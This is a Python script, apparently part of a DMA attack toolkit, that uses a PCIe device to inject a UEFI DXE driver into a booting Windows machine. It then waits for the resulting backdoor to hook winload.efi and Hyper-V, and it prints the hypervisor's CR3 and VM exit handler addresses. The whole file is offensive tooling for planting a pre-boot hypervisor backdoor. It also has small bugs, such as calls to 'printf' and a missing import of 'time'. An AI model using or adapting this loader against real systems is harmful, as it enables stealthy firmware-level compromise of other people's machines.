#!/usr/bin/env python

import sys, os
from struct import pack, unpack
from optparse import OptionParser

from pcie_lib import *
from uefi import *

HV_INFO_ADDR = STATUS_ADDR - (8 * 5)

# error codes
BACKDOOR_ERR_WINLOAD                 = -1 # winload.efi not found
BACKDOOR_ERR_BELOW_1MB_NOT_FOUND     = -2 # winload!HvlpBelow1MbPage not found
BACKDOOR_ERR_BELOW_1MB_NOT_ALLOCATED = -3 # winload!HvlpBelow1MbPage not allocated
BACKDOOR_ERR_TRANSFER_TO_HYPERVISOR  = -4 # winload!HvlpTransferToHypervisor() not found
BACKDOOR_ERR_LOW_MEMORY_STUB         = -5 # winload!HvlpLowMemoryStub() not found

def main():

    parser = OptionParser()

    parser.add_option('-p', '--payload', dest = 'payload', default = None,
        help = 'payload file path')

    parser.add_option('-s', '--system-table', dest = 'system_table', default = None,
        help = 'EFI_SYSTEM_TABLE address')

    # parse command line
    options, _ = parser.parse_args()
    options.system_table = None if options.system_table is None else int(options.system_table, 16)

    # inject DXE driver into the booting system
    dev = dxe_inject(payload = options.payload, system_table = options.system_table)
        
    if options.payload is None: return 0

    print('[+] DXE driver was planted, waiting for backdoor init...')    

    while True:

        # wait for DXE backdoor
        status = dev.mem_read_8(STATUS_ADDR)
        
        if status == 0:

            # not ready yet
            time.sleep(1)
            continue

        print('[+] DXE driver was executed')

        break

    print('[+] Waiting for Hyper-V init...')

    dev.mem_write_8(HV_INFO_ADDR, 0)

    while True:

        # wait for hypervisor
        status, winload_cr3, hv_cr3, hv_entry, hv_vmexit = unpack('qQQQQ', dev.mem_read(HV_INFO_ADDR, 8 * 5))

        if status == 0:

            # not ready yet
            time.sleep(1)
            continue

        if status == BACKDOOR_ERR_WINLOAD:

            print('ERROR: DXE driver is unable to locate winload.efi')
            break

        if status == BACKDOOR_ERR_BELOW_1MB_NOT_FOUND:

            print('ERROR: DXE driver is unable to locate winload!HvlpBelow1MbPage')
            break

        if status == BACKDOOR_ERR_BELOW_1MB_NOT_ALLOCATED:

            print('ERROR: winload!HvlpBelow1MbPage is not allocated, Hyper-V wasn\'t started')
            break

        if status == BACKDOOR_ERR_TRANSFER_TO_HYPERVISOR:

            print('ERROR: DXE driver is unable to locate winload!HvlpTransferToHypervisor()')
            break

        if status == BACKDOOR_ERR_LOW_MEMORY_STUB:

            printf('ERROR: DXE driver is unable to locate winload!HvlpLowMemoryStub()')
            break

        print('[+] Hyper-V image entry was executed\n')
        print('              Winload CR3: 0x%.16x' % winload_cr3)
        print('              Hyper-V CR3: 0x%.16x' % hv_cr3)
        print('  Hyper-V VM exit handler: 0x%.16x' % hv_vmexit)
        print('      Hyper-V image entry: 0x%.16x\n' % hv_entry)

        if hv_vmexit == 0:

            printf('ERROR: Unable to locate Hyper-V VM exit handler')

        break

    print('[+] DONE')
    
    dev.close()

    return 0

if __name__ == '__main__':

    exit(main())

#
# EoF
#
